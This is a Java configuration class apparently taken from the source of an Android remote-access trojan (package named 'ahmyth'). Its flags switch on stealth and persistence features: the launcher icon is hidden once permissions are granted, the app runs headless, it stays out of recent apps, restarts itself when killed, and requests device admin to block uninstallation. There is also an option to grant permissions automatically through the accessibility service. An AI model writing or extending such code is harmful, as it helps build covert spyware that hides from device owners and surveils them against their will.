package ahmyth.mine.king.ahmyth;

/**
 * StealthConfig - Configuration for stealth/hidden mode
 * These values can be modified during APK build process
 */
public class StealthConfig {
    
    // Hide app icon from launcher after first run
    public static boolean HIDE_ICON = true;
    
    // Exclude from recent apps list
    public static boolean HIDE_FROM_RECENTS = true;
    
    // Start service automatically on boot
    public static boolean START_ON_BOOT = true;
    
    // Use silent/minimal notification
    public static boolean SILENT_NOTIFICATION = true;
    
    // Auto-restart service if killed
    public static boolean PERSISTENT_SERVICE = true;
    
    // Keep CPU wake lock for background operation
    public static boolean WAKE_LOCK = true;
    
    // Delay before hiding icon (ms) - give time for permissions
    public static int HIDE_DELAY_MS = 5000;
    
    // Close activity after setup (run headless)
    public static boolean AUTO_CLOSE_ACTIVITY = true;
    
    // Request device admin to prevent uninstallation
    public static boolean UNINSTALL_PROTECTION = true;
    
    // === Silent Permissions ===
    
    // Skip showing permission explanation dialogs
    public static boolean SKIP_PERMISSION_PROMPTS = false;
    
    // Use accessibility service to auto-grant permissions
    public static boolean USE_ACCESSIBILITY_GRANTER = false;
    
    // Act as device owner (requires provisioning)
    public static boolean DEVICE_OWNER_MODE = false;
}

